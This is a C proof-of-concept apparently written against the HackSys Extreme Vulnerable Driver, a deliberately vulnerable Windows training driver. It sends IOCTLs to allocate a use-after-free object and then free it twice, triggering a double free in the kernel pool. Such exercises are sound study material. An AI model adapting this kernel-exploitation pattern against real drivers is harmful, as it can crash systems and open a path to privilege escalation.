#include <stdio.h>
#include <tchar.h>
#include <windows.h>
#include <winternl.h>
#include <strsafe.h>
#include <assert.h>
#include <conio.h>

#define HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_NEITHER, FILE_ANY_ACCESS)

typedef enum { L_DEBUG, L_INFO, L_WARN, L_ERROR } LEVEL, *PLEVEL;
#define MAX_LOG_MESSAGE 1024

BOOL LogMessage(LEVEL Level, LPCTSTR Format, ...)
{
	TCHAR Buffer[MAX_LOG_MESSAGE] = { 0 };
	va_list Args;

	va_start(Args, Format);
	StringCchVPrintf(Buffer, MAX_LOG_MESSAGE, Format, Args);
	va_end(Args);

	switch (Level) {
	case L_DEBUG: _ftprintf(stdout, TEXT("[?] %s\n"), Buffer); break;
	case L_INFO:  _ftprintf(stdout, TEXT("[+] %s\n"), Buffer); break;
	case L_WARN:  _ftprintf(stderr, TEXT("[*] %s\n"), Buffer); break;
	case L_ERROR: _ftprintf(stderr, TEXT("[!] %s\n"), Buffer); break;
	}

	fflush(stdout);
	fflush(stderr);

	return TRUE;
}

int main()
{
	LPCWSTR lpDeviceName = L"\\\\.\\HacksysExtremeVulnerableDriver";
	HANDLE hDevice;
	BOOL bResult = FALSE;
	DWORD junk = 0;


	LogMessage(L_INFO,L"*****Start Exploit*****");
	hDevice = CreateFile(lpDeviceName,					// Name of the write
		GENERIC_READ | GENERIC_WRITE,					// Open for reading/writing
		FILE_SHARE_WRITE,								// Allow Share
		NULL,											// Default security
		OPEN_EXISTING,									// Opens a file or device, only if it exists.
		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,	// Normal file
		NULL); // No attr. template
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		LogMessage(L_ERROR,L"Unable to get Driver handle");
		exit(1);
	}
	LogMessage(L_INFO,L"Create HEVD Device Success,Handle at: 0x%p",hDevice);
	LogMessage(L_INFO,L"Allocate HEVD NonPaged Pool");
	bResult = DeviceIoControl(hDevice,	// Device to be queried
		HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT,						// Operation to perform
		NULL,				// Input Buffer		
		0,			// Buffer Size
		NULL, 0,						// Output Buffer
		&junk,							// # Bytes returned
		(LPOVERLAPPED)NULL); // Synchronous I/O	
	if(!bResult)
	{
		LogMessage(L_ERROR,L"Unable to Allocate NonPagedPool");
		exit(1);
	}
	LogMessage(L_INFO,L"Allocate HEVD NonPagedPool Success");
	LogMessage(L_INFO,L"Free HEVD NonPage Pool first time");
	bResult = DeviceIoControl(hDevice,	// Device to be queried
		HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT,						// Operation to perform
		NULL,				// Input Buffer		
		0,			// Buffer Size
		NULL, 0,						// Output Buffer
		&junk,							// # Bytes returned
		(LPOVERLAPPED)NULL); // Synchronous I/O	
	if(!bResult)
	{
		LogMessage(L_ERROR,L"Unable to Free NonPagedPool first");
		exit(1);
	}
	LogMessage(L_INFO,L"Free HEVD NonPage Pool first time Success");
	LogMessage(L_INFO,L"Free HEVD NonPage Pool second time");
	bResult = DeviceIoControl(hDevice,	// Device to be queried
		HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT,						// Operation to perform
		NULL,				// Input Buffer		
		0,			// Buffer Size
		NULL, 0,						// Output Buffer
		&junk,							// # Bytes returned
		(LPOVERLAPPED)NULL); // Synchronous I/O	
	if(!bResult)
	{
		LogMessage(L_ERROR,L"Unable to Free NonPagedPool second");
		exit(1);
	}
	//_debugbreak();
	LogMessage(L_DEBUG,L"Double free Fucking failure if show this case...");
}